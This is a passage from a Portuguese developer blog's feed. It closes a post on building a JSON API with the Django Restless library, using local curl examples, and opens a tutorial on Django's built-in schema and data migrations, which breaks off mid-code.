&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -X PUT -H &lt;span class="s2"&gt;&amp;quot;Content-Type: application/json&amp;quot;&lt;/span&gt; -d &lt;span class="s1"&gt;&amp;#39;{&amp;quot;title&amp;quot;: &amp;quot;Zombieland&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;So much fun&amp;quot;}&amp;#39;&lt;/span&gt; http://localhost:8000/movies/bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4/

&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Zombieland&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;So much fun&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E remover um filme através da API:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="k"&gt;DELETE&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bd02d0eb&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;b75&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="n"&gt;bfe&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8222&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ba24f7a1cad4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Gosto bastante do &lt;em&gt;Restless&lt;/em&gt; pela sua filosofia de manter-se simples. Mas nem tudo são rosas!
A falta de autorização, &lt;em&gt;HATEOAS&lt;/em&gt; e saídas em outros formatos (como &lt;em&gt;XML&lt;/em&gt;, por exemplo)
podem ser argumentos decisivos para a escolha de uma biblioteca mais completa.&lt;/p&gt;
&lt;p&gt;Eu costumo utilizar o &lt;em&gt;Restless&lt;/em&gt; em projetos muito específicos, onde sei que a &lt;em&gt;API&lt;/em&gt; será sempre
&lt;em&gt;JSON&lt;/em&gt;, e integrações com o &lt;em&gt;ORM&lt;/em&gt; trarão mais dores de cabeça do que soluções (em um cenário
onde há interação com bancos &lt;em&gt;NoSQL&lt;/em&gt;, o &lt;em&gt;Restless&lt;/em&gt; se mostra uma ferramenta muito útil).&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/kplaube/post-django-restless" title="Veja o exemplo completo no Github"&gt;Confira o exemplo desse &lt;em&gt;post&lt;/em&gt; no Github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="apis"></category><category term="python"></category><category term="django"></category><category term="rest"></category><category term="restless"></category></entry><entry><title>As built-in migrations do Django</title><link href="https://klauslaube.com.br/2016/10/18/as-built-in-migrations-do-django.html" rel="alternate"></link><published>2016-10-18T12:43:00-02:00</published><updated>2016-10-18T12:43:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-10-18:/2016/10/18/as-built-in-migrations-do-django.html</id><summary type="html">&lt;p&gt;Quem usa o &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; há mais tempo já ouviu
falar do &lt;a href="https://klauslaube.com.br/tag/south.html" title="Leia mais sobre South"&gt;&lt;em&gt;South&lt;/em&gt;&lt;/a&gt;. Famosa biblioteca
responsável por trazer o comportamento de &lt;a href="https://klauslaube.com.br/tag/migrations.html" title="Leia mais sobre Migrations"&gt;&lt;em&gt;migrations&lt;/em&gt;&lt;/a&gt;
para o &lt;em&gt;Django&lt;/em&gt;. Sem dúvida impactou inúmeros projetos e transformou o processo de
&lt;em&gt;deploy&lt;/em&gt; de toda a comunidade envolvida com o &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Nas versões mais recentes do &lt;em&gt;Django&lt;/em&gt;, contamos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Quem usa o &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; há mais tempo já ouviu
falar do &lt;a href="https://klauslaube.com.br/tag/south.html" title="Leia mais sobre South"&gt;&lt;em&gt;South&lt;/em&gt;&lt;/a&gt;. Famosa biblioteca
responsável por trazer o comportamento de &lt;a href="https://klauslaube.com.br/tag/migrations.html" title="Leia mais sobre Migrations"&gt;&lt;em&gt;migrations&lt;/em&gt;&lt;/a&gt;
para o &lt;em&gt;Django&lt;/em&gt;. Sem dúvida impactou inúmeros projetos e transformou o processo de
&lt;em&gt;deploy&lt;/em&gt; de toda a comunidade envolvida com o &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Nas versões mais recentes do &lt;em&gt;Django&lt;/em&gt;, contamos com um &lt;em&gt;engine&lt;/em&gt; &lt;em&gt;built-in&lt;/em&gt;,
muito prático, e que traz alguns conceitos que ficaram famosos com o &lt;em&gt;South&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos nessa dar adeus ao &lt;code&gt;syncdb&lt;/code&gt;, e começar a nossa aventura com o &lt;code&gt;migrate&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;O que são migrations?&lt;/h2&gt;
&lt;p&gt;Diretamente da documentação do &lt;em&gt;South&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) são uma forma de alterar o schema do seu banco de dados de uma versão para outra.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Você mantém em seu projeto uma série de instruções que modificam o &lt;em&gt;database&lt;/em&gt;
de acordo com a evolução do projeto. Quando uma nova pessoa fizer parte do time,
não é necessário a realização de nenhum "dump" &lt;em&gt;SQL&lt;/em&gt;, apenas a execução dessas &lt;em&gt;migrations&lt;/em&gt;
é o suficiente para você ter o &lt;em&gt;db&lt;/em&gt; pronto para uso.&lt;/p&gt;
&lt;p&gt;Dentro do ecossistema &lt;em&gt;Django&lt;/em&gt;, as &lt;em&gt;built-in migrations&lt;/em&gt; vieram como uma excelente
contribuição ao projeto. A distribuição de &lt;em&gt;apps&lt;/em&gt; fica mais coerente, agora que o
desenvolvedor não precisa mais de uma "segunda biblioteca" para passar a usar
um app que estamos distribuindo.&lt;/p&gt;
&lt;h2&gt;Faça migrations&lt;/h2&gt;
&lt;p&gt;Para exemplificar como toda essa mágica funciona, vamos criar um &lt;em&gt;app&lt;/em&gt; chamado "lista_de_compras":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py startapp lista_de_compras
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nosso &lt;em&gt;application&lt;/em&gt; terá uma estrutura similar a essa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;lista_de_compras/
    __init__.py
    admin.py
    apps.py
    migrations/
        __init__.py
    models.py
    tests.py
    views.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não esqueça de adicioná-lo ao &lt;code&gt;INSTALLED_APPS&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos nos focar na pasta &lt;code&gt;migrations&lt;/code&gt; e no &lt;code&gt;models.py&lt;/code&gt;. Nesse último, criaremos o modelo &lt;code&gt;Item&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# models.py&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;quantidade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IntegerField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora, na linha de comando, invocamos o comando de criação de &lt;em&gt;migrations&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py makemigrations
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se tudo ocorreu bem, na pasta &lt;code&gt;migrations&lt;/code&gt; do &lt;em&gt;app&lt;/em&gt;, um novo arquivo
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; foi criado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# migrations/0001_initial.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;__future__&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;unicode_literals&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;initial&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

    &lt;span class="n"&gt;dependencies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;operations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateModel&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Item&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;fields&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
                &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AutoField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;auto_created&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;serialize&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbose_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ID&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
                &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nome&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
                &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;quantidade&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IntegerField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
            &lt;span class="p"&gt;],&lt;/span&gt;
        &lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por partes:&lt;/p&gt;
&lt;p&gt;O &lt;code&gt;unicode_literals&lt;/code&gt; é uma ferramenta que torna possível a execução de seu projeto em &lt;em&gt;Python&lt;/em&gt; 2 e 3.
Ela tem a função de "marcar" suas &lt;em&gt;strings&lt;/em&gt; como &lt;em&gt;unicode&lt;/em&gt;, como explicado na &lt;a href="https://docs.djangoproject.com/en/1.10/topics/migrations/#supporting-python-2-and-3" title="Suportando Python 2 e 3"&gt;documentação do &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;É criada (automaticamente) uma classe &lt;code&gt;Migration&lt;/code&gt; herdando de &lt;code&gt;migrations.Migration&lt;/code&gt;. Nela, temos
3 propriedades muito importantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;initial&lt;/code&gt;: Informamos explicitamente ao &lt;em&gt;Django&lt;/em&gt; que essa é a &lt;em&gt;migration&lt;/em&gt; inicial do &lt;em&gt;app&lt;/em&gt;. Essa
  informação é importante para alguns casos, como quando é &lt;a href="https://docs.djangoproject.com/en/1.10/topics/migrations/#django.db.migrations.Migration.initial" title="Leia mais na documentação do Django"&gt;preciso executar o --fake-initial&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dependencies&lt;/code&gt;: Aqui informamos as dependências da nossa &lt;em&gt;migration&lt;/em&gt;. Por exemplo, se dependermos
  de outra &lt;em&gt;migration&lt;/em&gt; ou &lt;em&gt;app&lt;/em&gt;, precisamos deixar claro que há uma dependência para manter uma ordem
  coerente de execução.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;operations&lt;/code&gt;: Por fim, as operações que precisam ser executadas. No exemplo acima, estamos criando
  a tabela &lt;code&gt;lista_de_compras_item&lt;/code&gt;, com os campos &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;nome&lt;/code&gt; e &lt;code&gt;quantidade&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;No more syncdb&lt;/h2&gt;
&lt;p&gt;Calma! A tabela ainda não existe no banco dados. Para que isso aconteça é necessário executar o comando
&lt;code&gt;migrate&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py migrate
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;migrate&lt;/code&gt; executará todas as &lt;em&gt;migrations&lt;/em&gt; pendentes do seu projeto. Caso queira executar
apenas de um &lt;em&gt;app&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py migrate lista_de_compras
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Evoluindo o Schema&lt;/h2&gt;
&lt;p&gt;Vamos supor que exista o requisito de criar um &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;API REST&lt;/em&gt;&lt;/a&gt; para o projeto,
logo, expor o campo &lt;code&gt;id&lt;/code&gt; não é uma boa prática! Precisamos de um campo único e não
sequencial, que trará um pouco de &lt;em&gt;obfuscation&lt;/em&gt; e segurança ao nosso &lt;em&gt;endpoint&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Primeiro, adicionamos o campo ao modelo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# models.py&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;uuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UUIDField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;uuid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;editable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;quantidade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IntegerField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Seguindo o procedimento, para homologar as alterações em uma &lt;em&gt;migration&lt;/em&gt;, precisamos do &lt;code&gt;makemigrations&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py makemigrations lista_de_compras
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se você executar o &lt;code&gt;migrate&lt;/code&gt; em um banco de dados vazio, provavelmente não terá nenhum problema. Mas
em um banco já existente, provavelmente uma &lt;em&gt;exception&lt;/em&gt; acontecerá. O fato é que o uso do campo &lt;code&gt;unique&lt;/code&gt;
e o campo &lt;code&gt;default&lt;/code&gt;, em uma &lt;em&gt;migration&lt;/em&gt;, não é tão &lt;a href="https://code.djangoproject.com/ticket/23932" title="Document how to set a unique value for new fields using migrations"&gt;intuitivo como parece&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/croods-migration.jpg" width="640" height="360" title="Migrar é preciso (indiewire.com)" alt="Migrar é preciso (indiewire.com)"&gt;&lt;/p&gt;
&lt;p&gt;Para fazer esse procedimento, vamos seguir as recomendações da &lt;a href="https://docs.djangoproject.com/en/1.10/howto/writing-migrations/#migrations-that-add-unique-fields" title="Migrations that add unique fields"&gt;documentação do Django&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Primeiro, removemos os atributos &lt;code&gt;unique=True&lt;/code&gt; e &lt;code&gt;default=uuid.uuid4&lt;/code&gt; da &lt;em&gt;migration&lt;/em&gt; recém criada, e adicionamos
o parâmetro &lt;code&gt;null=True&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# migrations/0002_item_uuid.py&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;dependencies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lista_de_compras&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0001_initial&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;operations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;model_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;item&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UUIDField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;editable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O próximo passo é popular as linhas já existentes com &lt;code&gt;uuids&lt;/code&gt;. Faremos isso através de &lt;em&gt;data migrations&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Data migrations&lt;/h2&gt;
&lt;p&gt;Diretamente da documentação do &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Migrations that alter data are usually called “data migrations”;
they’re best written as separate migrations, sitting alongside your schema migrations.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em alguns casos precisamos inserir ou alterar dados, de acordo com a evolução do &lt;em&gt;database&lt;/em&gt;
do nosso projeto. O &lt;em&gt;Django&lt;/em&gt; não possui nenhuma forma "automática" para geração de
&lt;em&gt;data migrations&lt;/em&gt;, por isso, o caminho ideal é utilizar o comando &lt;code&gt;--empty&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py makemigrations --empty lista_de_compras
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com isso, uma &lt;em&gt;migration&lt;/em&gt; "em branco" será criada, pronta para customização:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;migrations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Migration&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;dependencies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;lista_de_compras&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0002_item_uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="n"&gt;operations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Importante notar que agora o atributo &lt;code&gt;dependencies&lt;/code&gt; está preenchido com a &lt;em&gt;migration&lt;/em&gt;
anterior à recém criada. É sempre necessário ter atenção à sua lista de dependências,
para certificar-se que o fluxo acontecerá numa ordem coerente.&lt;/p&gt;
&lt;p&gt;Criaremos a função responsável por inserir &lt;em&gt;UUIDs&lt;/em&gt; nos registros já existentes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# migrations/0003_auto_20161010_1635.py&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;uuid&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;gen_uuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;apps&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;schema_editor&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
